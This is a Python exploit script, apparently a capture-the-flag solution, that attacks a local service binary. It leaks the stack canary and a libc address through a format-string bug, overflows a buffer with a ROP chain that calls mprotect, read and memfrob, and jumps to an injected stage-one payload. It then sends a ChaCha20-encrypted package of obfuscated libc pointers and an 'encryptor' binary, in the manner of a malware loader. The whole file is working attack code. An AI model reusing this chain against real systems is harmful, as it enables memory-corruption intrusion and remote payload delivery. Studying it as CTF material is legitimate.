
from ctflib.pwn import *

from Crypto.Cipher import ChaCha20

e = ELF("service/service")
# libc = ELF("", checksec=False)
# ld = ELF("", checksec=False)
context.binary = e
#context.terminal = ['tmux', 'splitw', '-h']

def setup():
    # p = process()
    # p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
    p = remote("localhost:1338")
    return p


s1 = ELF("./stage1/stage1")


start = None
data = open("./stage1/stage1", "rb").read()
for seg in s1.iter_segments():
    if seg.header.p_flags == 5:
        start = seg.header.p_offset
        data = data[start:start+seg.header.p_filesz]
        break

offset = s1.sym._start - start

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))

if __name__ == '__main__':
    # offset = find_bof_offset(setup)
    p = setup()

    # p.brpt(0x0000000000401343)

    p.sendline(b"%13$p %15$p")

    p.recvuntil(b"OOps! ")
    l = p.recvline().split(b" ")[:2]
    canary = find_hex(l[0])
    libc_main = find_hex(l[1])

    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    libc.address = libc_main - 0x27c8a
    print(hex(libc.address))

    rop = ROP(libc)
    base = 0x0000000000401000

    rop.call(libc.sym.mprotect, (base, 0x2000, 7))
    base += 0x100
    rop.call(libc.sym.read, (0, base, 0x2000))
    rop.call(libc.sym.memfrob, (base, 0x1000))
    print(hex(base + offset))
    rop.call(base + offset)

    p.sendline(b"A"*0x28+p64(canary)+p64(0) + rop.chain())
    p.sendline(b"a")
    p.sendline(b"a")
    pause(1)

    p.sendline(bytes([x ^ 42 for x in data]))

    p.recvuntil(b"):")
    pause(1)


    n = 14
    entry = 0x11ba
    codes = [0x14d5aa1600f3e5d9,
                0x5d511c2e110e5275,
                0x55f0da578c4bd81b,
                0x33b2517a86d9eb0b,
                0x7c8b0942031354ea,
                0x6d9e4b46db60dd1f,
                0x72d6344709a0fa67,
                0x189066bd7d8d9bd,
                0xa26aa4f03710cd6,
                0x3981f34dfb76a55a,
                0x7ab7e196eaadd041,
                0x1b2495a2efa68959,
                0x175c1ec168423414, 0x5cb96200dec27ed1]+[0]*(0x10-n)
    names = ['rand', 'memset', 'mmap', 'write', 'srand', 'wait', 'usleep', 'read', 'getpid', 'fork', 'open', 'close', 'clock_gettime', 'exit']
    offsets = [libc.sym[x] for x in names]+[0]*(0x10-n)

    plain = p32(entry)+p32(n)
    plain += b"".join(encrypt(x, codes[i]) for i,x in enumerate(offsets))
    plain += b"".join(p64(x) for x in codes)
    plain += open("./encryptor/encryptor_nolib", "rb").read()
    key = b'why does malware keep using rc4?'
    nonce = b"\0"*12
    cipher = ChaCha20.new(key=key, nonce=nonce)
    ct = cipher.encrypt(plain)
    p.send(p32(len(ct))+ct)

    p.interactive()
